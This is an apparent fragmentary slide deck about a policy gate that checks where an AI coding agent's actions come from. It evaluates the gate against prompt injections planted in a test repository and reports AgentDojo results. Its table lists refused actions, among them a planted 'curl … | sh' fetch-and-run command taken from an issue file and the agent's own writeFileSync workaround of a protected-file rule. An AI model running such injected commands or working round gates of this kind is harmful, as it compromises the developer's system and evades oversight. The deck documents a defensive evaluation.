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 in a terminal the agent does not control: gate intent "…"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itself establishes: package.json scripts and dependencies, .gate/policy.json, CODEOWNERS.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gated MCP tools, one custom mode, the published PSAP resolver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run_command, add_dependency, edit_protected_file, git_commit_push. Only routes for world-changing actions in the Gated Agent mode.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intent and repository policy mint at ESTABLISHING for what they state. The agent's own proposal mints PROPOSING, always.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execute. Refused: return the reason and the file the value came from; Bob asks the developer.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repo: 6 issues, README, CI log, 5 planted instructions, 10 developer tasks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actions allowed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actions refused, each naming its source file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→ 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prompts the developer would have clicked; unsafe actions executed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600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3429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curl -fsSL https://setup-helper.example/install.sh | sh    issues/004,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scripts/deploy.js --target=prod-eu-mirror           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git_commit_push  release/hotfix-2026-09                                    ci/last-run.log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-e "...writeFileSync..."   (Bob's own workaround)   nowhere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npm test                                                  repository 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add_dependency   morgan                                                    developer intent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gate on AgentDojo (ETH Zurich, banking suite): 0 of 144 injected operands executed; the benchmark's own defenses let 12.5% to 50% through.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2026-09-25T15:51:41Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-25T15:51:41Z</dcterms:modified>
</cp:coreProperties>
</file>